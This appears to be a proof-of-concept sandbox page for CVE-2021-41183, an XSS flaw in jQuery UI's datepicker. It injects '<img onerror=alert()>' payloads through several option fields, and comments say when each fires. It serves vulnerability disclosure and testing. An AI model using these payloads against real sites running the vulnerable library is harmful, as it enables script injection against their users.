<!--
    CVE Sandbox :: jQuery UI :: CVE-2021-41183
    Version: jQuery UI < 1.13.0
    ------------------------------------------------------------------------------------
    The XSS payload is injected directly into DatePicker initialization script
    Payloads are executed when special conditions are met, see comments
    ------------------------------------------------------------------------------------
    POC Author: https://twitter.com/therceman
-->

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js"></script>
<link rel="stylesheet" href="https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/themes/base/jquery-ui.css">

<!-- Source is not input -->

<div id="datepicker_cont"></div>

<script>
    $('#datepicker_cont').datepicker({
        prevText: '<img src=1 onerror=alert(1)>', // w/o interaction when HTML source is not input (#datepicker_cont)
        nextText: '<img src=1 onerror=alert(2)>', // w/o interaction when HTML source is not input (#datepicker_cont)
    });
</script>

<!-- Source is input -->

<label for="datepicker_input">Click input field to open a Datepicker</label>
<input type="text" id="datepicker_input">

<script>
    $('#datepicker_input').datepicker({
        showButtonPanel: true,
        showOn: 'both',
        closeText: '<img src=1 onerror=alert(3)>',   // triggered when is open + {showButtonPanel: true}
        currentText: '<img src=1 onerror=alert(4)>', // triggered when is open + {showButtonPanel: true}
        buttonText: '<img src=1 onerror=alert(5)>',  // w/o interaction when source is input + {showOn:'button'/'both'}
        appendText: '<img src=1 onerror=alert(6)>'   // w/o interaction when source is input
    });
</script>